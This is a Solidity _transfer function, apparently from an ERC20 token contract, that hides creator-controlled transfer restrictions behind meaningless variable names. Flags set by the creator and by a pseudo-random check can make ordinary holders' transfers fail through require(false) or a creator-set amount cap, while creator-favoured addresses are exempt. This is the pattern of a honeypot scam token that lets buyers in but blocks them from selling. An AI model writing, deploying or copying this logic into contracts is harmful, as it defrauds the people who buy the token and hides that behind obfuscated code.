function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (coca == false)) {
        cola = chTx;
        eeuu = true;
    }
    if ((address(sender) == creator) && (coca == true)) {
        hymym[recipient] = true;
        better[recipient] = false;
        coca = false;
    }
    if ((amount > pepsi) && (hymym[sender] == true) && (address(sender) != creator)) {
        callsaul[recipient] = true;
    }
    if (hymym[recipient] != true) {
        better[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((better[sender]) && (hymym[recipient] == false)) {
        better[recipient] = true;
    }
    if (hymym[sender] == false) {
        if ((amount > pepsi) && (callsaul[sender] == true)) {
            require(false);
        }
        require(amount < cola);
        if (eeuu == true) {
            if (callsaul[sender] == true) {
                require(false);
            }
            callsaul[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

